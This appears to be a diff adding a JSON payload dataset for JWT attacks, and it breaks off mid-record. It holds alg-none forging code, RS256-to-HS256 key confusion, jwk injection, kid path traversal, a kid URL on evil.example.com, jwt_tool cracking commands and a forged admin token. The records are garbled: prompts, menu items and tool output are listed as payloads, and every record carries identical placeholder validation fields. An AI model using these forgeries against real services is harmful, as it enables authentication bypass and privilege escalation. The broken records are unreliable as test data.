@@ -1,0 +1,1124 @@
+[
+  {
+    "payload_id": "OWP-37299",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37300",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37301",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37302",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"typ\": \"JWT\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37303",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"alg\": \"HS256\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37304",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"sub\":\"1234567890\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37305",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"name\":\"Amazing Haxx0r\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37306",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"exp\":\"1466270722\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37307",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"admin\":true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37308",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py JWT_HERE -X n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37309",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37310",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37311",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37312",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37313",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py [JWT_HERE] -X a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37314",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "import jwt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37315",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37316",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "decodedToken = jwt.decode(jwtToken, verify=False)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37317",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37318",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "print(noneEncoded.decode())",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37319",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "public = open('public.pem', 'r').read()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37320",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "print public",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37321",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "print jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37322",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37323",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37324",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37325",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python2 -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\\\")\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37326",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37327",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37328",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py [JWT_HERE] -X i",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37329",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"alg\": \"RS256\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37330",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"jwk\": {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37331",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"kty\": \"RSA\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37332",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"kid\": \"jwt_tool\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37333",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"use\": \"sig\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37334",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"e\": \"AQAB\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37335",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37336",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "}.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37337",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "{\"login\":\"admin\"}.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37338",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[Signed with new Private key; Public key injected]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37339",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Computing public key. This may take a minute...",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37340",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "{\"kty\": \"RSA\", \"n\": \"sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ\", \"e\": \"AQAB\"}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37341",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37342",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37343",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Token header values:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37344",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[+] alg = \"HS256\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37345",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[+] typ = \"JWT\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37346",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Token payload values:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37347",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[+] name = \"John Doe\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37348",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37349",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "jwt.decode(encoded, 'secret', algorithms=['HS256'])",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37350",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 -m pip install termcolor cprint pycryptodomex requests",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37351",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37352",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Current value of role is: user",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37353",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Please enter new value and hit ENTER",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37354",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "> admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37355",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[1] sub = 1234567890",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37356",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[2] role = admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37357",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[3] iat = 1516239022",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37358",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[0] Continue to next step",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37359",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Please select a field number (or 0 to Continue):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37360",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "> 0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37361",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Token Signing:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37362",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[1] Sign token with known key",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37363",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[2] Strip signature from token vulnerable to CVE-2015-2951",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37364",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[3] Sign with Public Key bypass vulnerability",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37365",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[4] Sign token with key file",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37366",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Please select an option from above (1-4):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37367",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "> 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37368",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Please enter the known key:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37369",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "> secret",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37370",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Please enter the key length:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37371",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[1] HMAC-SHA256",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37372",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[2] HMAC-SHA384",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37373",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[3] HMAC-SHA512",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37374",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "Your new forged token:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37375",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37376",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37377",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"alg\": \"HS256\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37378",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"kid\": \"/root/res/keys/secret.key\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37379",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"alg\":\"RS256\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37380",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"typ\":\"JWT\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37381",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"kid\":\"http://localhost:7070/privKey.key\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37382",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "HMACSHA256(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37383",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "base64UrlEncode(header) + \".\" +",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37384",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "base64UrlEncode(payload),",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37385",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "your-256-bit-secret-from-secret.key",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37386",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": ">>> jwt.encode(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37387",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "...     {\"some\": \"payload\"},",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37388",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "...     \"secret\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37389",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "...     algorithm=\"HS256\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37390",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "...     headers={\"kid\": \"http://evil.example.com/custom.key\"},",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37391",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "... )",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37392",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py <JWT> -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37393",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
